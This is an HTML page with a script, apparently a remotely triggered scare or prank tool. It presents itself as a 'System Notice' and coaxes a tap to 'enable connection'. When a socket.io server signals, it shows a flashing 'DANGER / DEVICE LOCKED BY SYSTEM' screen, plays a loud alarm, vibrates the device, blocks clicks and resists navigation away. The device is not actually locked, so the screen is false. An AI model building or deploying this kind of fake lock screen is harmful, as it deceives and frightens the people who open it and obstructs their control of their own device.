<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>System Notice</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      color: #fff;
      font-family: monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }
    #overlay {
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: fixed;
      inset: 0;
      background: #990000;
      z-index: 999999;
      animation: flash 0.4s infinite alternate;
    }
    h1 { font-size: 3.5rem; letter-spacing: 6px; margin: 0; text-align: center; }
    p { font-size: 1.3rem; margin-top: 15px; text-align: center; }
    @keyframes flash {
      from { background: #500; }
      to { background: #ff0000; }
    }
  </style>
</head>
<body>

  <div id="overlay">
    <h1>DANGER</h1>
    <p>DEVICE LOCKED BY SYSTEM</p>
  </div>

  <div id="idle" style="color: #333; font-size: 0.8rem; text-align: center;">
    Initialising secure channel...<br>Tap anywhere to enable connection.
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const overlay = document.getElementById('overlay');
    const idle = document.getElementById('idle');

    let audioCtx = null;
    let osc = null;
    let isLocked = false;

    function playAlarm() {
      if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      if (osc) return;

      osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      
      osc.type = 'sawtooth';
      osc.frequency.setValueAtTime(900, audioCtx.currentTime);
      
      setInterval(() => {
        if (!osc) return;
        osc.frequency.linearRampToValueAtTime(1400, audioCtx.currentTime + 0.25);
        osc.frequency.linearRampToValueAtTime(900, audioCtx.currentTime + 0.5);
      }, 500);

      gain.gain.setValueAtTime(0.4, audioCtx.currentTime);
      osc.connect(gain);
      gain.connect(audioCtx.destination);
      osc.start();
    }

    function stopAlarm() {
      if (osc) {
        osc.stop();
        osc.disconnect();
        osc = null;
      }
    }

    // Mencegah navigasi atau tombol kembali saat terkunci
    window.addEventListener('beforeunload', (e) => {
      if (isLocked) {
        e.preventDefault();
        e.returnValue = '';
      }
    });

    // Mencegah interaksi sentuh/klik keluar saat status terkunci
    document.addEventListener('click', (e) => {
      if (isLocked) {
        e.stopPropagation();
        e.preventDefault();
      }
    }, true);

    socket.on('remote-action', (data) => {
      if (data.action === 'trigger') {
        isLocked = true;
        overlay.style.display = 'flex';
        idle.style.display = 'none';
        if (data.sound) playAlarm();
        if ("vibrate" in navigator) {
          // Getar terus-menerus jika didukung browser
          navigator.vibrate([1000, 200, 1000, 200]);
        }
      } else if (data.action === 'dismiss') {
        isLocked = false;
        overlay.style.display = 'none';
        idle.style.display = 'block';
        stopAlarm();
        if ("vibrate" in navigator) navigator.vibrate(0);
      }
    });
  </script>
</body>
</html>
